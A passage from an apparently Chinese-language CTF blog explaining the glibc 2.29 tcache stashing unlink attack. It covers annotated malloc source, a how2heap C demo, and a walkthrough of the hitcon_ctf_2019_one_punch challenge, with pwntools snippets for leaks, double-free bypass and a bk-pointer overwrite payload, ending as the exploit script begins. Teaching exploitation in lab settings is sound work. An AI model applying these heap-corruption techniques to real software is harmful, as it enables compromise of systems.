alt="image-20211125141941343"></p><p>最后 56 行处再次申请 chunk，即栈上伪造的chunk</p><h2 id="2-29（tcache-stashing-unlink-attack）"><a href="#2-29（tcache-stashing-unlink-attack）" class="headerlink" title="2.29（tcache stashing unlink attack）"></a>2.29（tcache stashing unlink attack）</h2><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><p>2.29 加入了 tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE <span class="comment">//如果程序启用了Tcache</span></span></span><br><span class="line">        <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">        stash them in the tcache.  */</span></span><br><span class="line">        <span class="comment">//遍历整个smallbin，获取相同size的free chunk</span></span><br><span class="line">        <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            mchunkptr tc_victim;</span><br><span class="line">            <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">            <span class="comment">//判定Tcache的size链表是否已满，并且取出smallbin的末尾Chunk。</span></span><br><span class="line">            <span class="comment">//验证取出的Chunk是否为Bin本身（Smallbin是否已空）</span></span><br><span class="line">            <span class="keyword">while</span> ( tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                   &amp;&amp; (tc_victim = last (bin) ) != bin)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//如果成功获取了Chunk</span></span><br><span class="line">                <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">                    bck = tc_victim-&gt;bk;</span><br><span class="line">                    <span class="comment">//设置标志位</span></span><br><span class="line">                    set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">                    <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">                    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena (tc_victim);</span><br><span class="line">                    <span class="comment">//取出最后一个Chunk</span></span><br><span class="line">                    bin-&gt;bk = bck;</span><br><span class="line">                    bck-&gt;fd = bin;</span><br><span class="line">                    <span class="comment">//将其放入到Tcache中</span></span><br><span class="line">                    tcache_put (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>结合之前 2.23 的源码可以发现，tcache 并没有检查 house of lore 要经历的检查 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line"><span class="keyword">if</span> ( __glibc_unlikely( bck-&gt;fd != victim ) )</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br></pre></td></tr></table></figure><p>我们知道，tcache 是享有绝对优先权的，我们不能越过 tcache 向 small bin 中增删 chunk（但是 calloc 函数不会在 tcache 中拿 chunk）</p><p>攻击条件有两点：</p><ol><li>small bin 中至少两个 chunk</li><li>tcache  不为空</li></ol><p>然后是 Unsorted Bin 的<code>last remainder</code>基址，当申请的 Chunk 大于 Unsorted Bin 中 Chunk 的大小且其为 Unsorted Bin 中的唯一 Chunk 时，该 Chunk 不会进入 Tcache 。</p><h3 id="tcache-put-函数"><a href="#tcache-put-函数" class="headerlink" title="tcache_put 函数"></a>tcache_put 函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> <span class="title">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现，<code>tcache_put</code>函数没有做任何的安全检查。</p><p>那么，当 Tcache 存在两个以上的空位时，程序会将我们的 fake chunk 置入 Tcache 。</p><h3 id="how2heap-代码演示-1"><a href="#how2heap-代码演示-1" class="headerlink" title="how2heap 代码演示"></a>how2heap 代码演示</h3><p>参考的是 hollk 师傅的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g -no-pie hollk.c -o hollk</span></span><br><span class="line"><span class="comment">//patchelf --set-rpath 路径/2.27-3ubuntu1_amd64/ hollk</span></span><br><span class="line"><span class="comment">//patchelf --set-interpreter 路径/2.27-3ubuntu1_amd64/ld-linux-x86-64.so.2 hollk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_var addr is:%p\n&quot;</span>,&amp;stack_var[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk_lis addr is:%p\n&quot;</span>,&amp;chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target addr is:%p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    </span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target now: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把断点下在 18 行，初始化了一个 0x10 大小的数组 stack_var ，一个 0x10 大小的指针数组 chunk_lis ，一个指针 target</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1643181922995650/e46b170fa72be0963afc9a905fdcdf11091f15f7.png" alt="image-20220126152522755"></p><p>20 行，将 stack_var[2] 的地址赋给 stack_var[3]</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1643182045220950/8ecf8f9561e2591f5bac0544a2063ebc1c138762.png" alt="image-20220126152725055"></p><p>28 行， 创建 9 个大小为 0x90（0xa0）的 chunk，并 free 掉 chunk3 - chunk8</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1643182398142573/1847254da19177dda69386aef941ed4bb0852582.png" alt="image-20220126153317964"></p><p>32 行，依次 free 掉 chunk1 、chunk0 和 chunk2</p><p>free chunk1 后 tcachebin 被填满，所以 chunk0 和 chunk2 会被放置到 unsortedbin 中</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1643182540499512/2a185012be0776f604a5977694f4333fb756ac56.png" alt="image-20220126153540317"></p><p>34 行，当我们 malloc 0xa0 大小的 chunk，依据 unsorted bin 的机制，申请时会查找 unsortedbin 中是否有符合大小的空闲块，如果没有，unsorted bin 中的空闲块就会按照 size 被分配进 <strong>small bin</strong> 中</p><p><img src="C:\Users\35585\AppData\Roaming\Typora\typora-user-images\image-20220126154139206.png" alt="image-20220126154139206"></p><p>36 行，再 malloc 两个大小为 0x90 的 chunk，因为是 malloc 申请并且 tcache bin 中也能给出相应大小的空闲块，所以此时会在 tcachebin 中拿出两个 chunk</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1643183243863788/87780be35444b0746ea77efe9ae21441d1612253.png" alt="image-20220126154723704"></p><p>38 行，整句话的意思是把 chunk_lis 中对于 idx 为 2 的 chunk ，将其 bk 位 设置为 stack_var</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1643183513003354/3d6c7a3868e3bff584c850fe11a5776ff3dc9657.png" alt="image-20220126155152802"></p><p>stack_var 链入 smallbin</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1643184047039691/40adb5afc4bce73a2871028e29ee21bd52e5b264.png" alt="image-20220126160046882"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1643184189695556/b5ab504ef2961bb58b2270a78b7fb063a1c7d22f.png" alt="image-20220126160309528"></p><p>39 行，calloc 了一个 0x90 大小的 chunk</p><p>calloc 在申请 chunk 时会直接越过 tcache bin 向 small bin 中拿 chunk，又因为 small bin 遵循先进先出，所以 chunk0 会被拿出来，tcache bin 没有放满，会从 small bin 中拿 chunk (顺着bk)挂进 tcachebin 中，并且这个过程只会检查第一个 chunk （此处对应 chunk2）的完整性</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-lore/1643185546710683/d26b45bff55d16dd472df62cd21933e81303b332.png" alt="image-20220126162546530"></p><p>41 行，此时再 malloc 一个 0x90 大小的 chunk，就会从 tcachebin 中拿出 stack_var</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p> buuctf hitcon_ctf_2019_one_punch</p><p>保护全开并且开了沙盒，所以orw</p><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><ul><li>delete 函数中存在 uaf </li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_1568</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  write_0(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">  idx = my_read(<span class="string">&quot;idx: &quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">2</span> )</span><br><span class="line">    error(<span class="string">&quot;invalid&quot;</span>, a2);</span><br><span class="line">  <span class="built_in">free</span>(*(&amp;chunk_addr + <span class="number">2</span> * idx)); <span class="comment">//uaf</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>add 函数申请 chunk 都是 calloc，并且堆的大小限制在<code> 0x80~0x3ff</code> 之间</p></li><li><p>存在一个后门函数可以通过 malloc 申请 chunk，但是会有一个 if 检查 tcachebin 中 0x220 大小的 bin 个数要  &lt;= 6</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_15BB</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(qword_4030 + <span class="number">0x20</span>) &lt;= <span class="number">6</span> ) <span class="comment">//检查</span></span><br><span class="line">    error(<span class="string">&quot;gg&quot;</span>, a2);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x217</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !buf )</span><br><span class="line">    error(<span class="string">&quot;err&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x217</span>uLL) &lt;= <span class="number">0</span> )</span><br><span class="line">    error(<span class="string">&quot;io&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Serious Punch!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;unk_2128);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路（最好还是直接拿着exp调试）"><a href="#思路（最好还是直接拿着exp调试）" class="headerlink" title="思路（最好还是直接拿着exp调试）"></a>思路（最好还是直接拿着exp调试）</h4><p>首先当然还是得先泄露，2.29 版本存在 double free 的检查</p><p>free 掉的 chunk 仍然可以 edit，于是可以 free 掉一个 chunk 的同时 edit，就能绕过 double free 的检查</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x218</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643376809982814/7c8bd318663f8765f10a72179f325c02b44f8d74.png" alt="image-20220128213329838"></p><p>此时再 free 掉一个同样大小的 chunk，就能泄露</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">print(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap))</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643376853108201/2989aba1ead01fcf493d30cd9ae5564ec5f4a696.png" alt="image-20220128213412963"></p><p>同理再 edit 一次 chunk，并将其 free 掉，就可以进入 unsorted bin，libc 也就泄露出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7fd7469b7ca0</span> - <span class="number">0x7fd7467d3000</span>)</span><br><span class="line">print(<span class="string">&quot;libcbase:&quot;</span>+<span class="built_in">hex</span>(libcbase))</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643377311462327/aba821a953517a457d3b5416a347b75d9d1ae110.png" alt="image-20220128214151302"></p><p>接着就要布局实现 Tcache Stashing Unlink Attack 了</p><p>先在 tcachebins 中放入 6 个大小为 0x90 的 chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;x&#x27;</span>*<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643378249508649/03c9dcd04465349f1ec561cba075878f55c5afe6.png" alt="image-20220128215729351"></p><p>再申请 0x180 大小的 chunk，因为之前 unsorted bin 中已有 0x220 大小的空闲块，此时会从 unsorted bin 中拿，还剩 0x90</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x180</span>)</span><br></pre></td></tr></table></figure><p>效果如下</p><p>前：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643379254763058/004724d7a063040d6f25bb253f94a6d7cd9575da.png" alt="image-20220128221414604"></p><p>后：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643379329125734/45c8c07a44da0cf94eb4414cb02a66852f63612b.png" alt="image-20220128221528970"></p><p>再申请一个 0x400 大小的 chunk</p><p>此时 unsorted bin 给不出足够大小的空闲块，依据上面所说的，unsorted bin 中的 chunk 会按照 size 大小放入 small bin 或 large bin 中（0x90 对应 small bin）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)<span class="comment">#防止前面的chunk与topchunk合并 </span></span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643380586139383/a6ba123d13c47b90cfcfba23e72f074d78e90283.png" alt="image-20220128223625967"></p><p>再用之前一样的方法把 0x400 大小的 chunk 挂入 tcachebin 和 unsorted bin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643380798673230/95d6d8800ece9e2f772669a7d1aa3e7d6b8f8a02.png" alt="image-20220128223958498"></p><p>同理再申请两个 chunk，unsorted bin 中的 chunk 再次被放入 small bin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x370</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x400</span>)</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643381045133649/e08a51417a587640eda1b9ff866771c2a86edbd2.png" alt="image-20220128224404926"></p><p>此时就会出现一个很奇怪的现象，明明指针处是 0x410 的空闲块，此时的 size 却是 0x381，这是因为之前 free 了 <code>8</code> 个大小为 0x400 的块，其中有 7 个放入了 tcachebin ，剩下的一个放入了 unsortedbin，<code>add(2,&#39;b&#39;*0x370)</code>拿的就是unsorted bin 中的 chunk，<strong>它们的 chunk 首地址都是相同的，所以产生了堆重叠</strong></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643381267269721/9ab5135185b34c6c9b747f7ba5fba9495f5d7fb2.png" alt="image-20220128224747066"></p><p>所以这个时候就可以通过 edit chunk1 堆溢出修改下面的 small bin 里的 bk ，main_arena 链入 small bin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pay = <span class="string">&#x27;d&#x27;</span>*<span class="number">0x370</span></span><br><span class="line">pay+= p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">pay+= p64(heap+<span class="number">0x180</span>) + p64(heap-<span class="number">0x260</span>+<span class="number">0x20</span>)<span class="comment">#fd bk </span></span><br><span class="line">edit(<span class="number">1</span>,pay)</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643382019656802/e15444b2bcb79ee566c5a41915556996f84766aa.png" alt="image-20220128230019482"></p><p>再利用 calloc 申请堆就能将 small bin 中的 chunk 链入 tcachebin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure><p>效果如下</p><p>前：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643382418018433/d161bc4e7b1167b3787cd3162a24e29c62238b44.png" alt="image-20220128230657852"></p><p>后：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643382382608130/356537389d1553cc45b92eedab6e55eb6d298b26.png" alt="image-20220128230622411"></p><p>之后就是在堆上 malloc_hook，再在 malloc_hook 里写入 orw</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc = ELF(<span 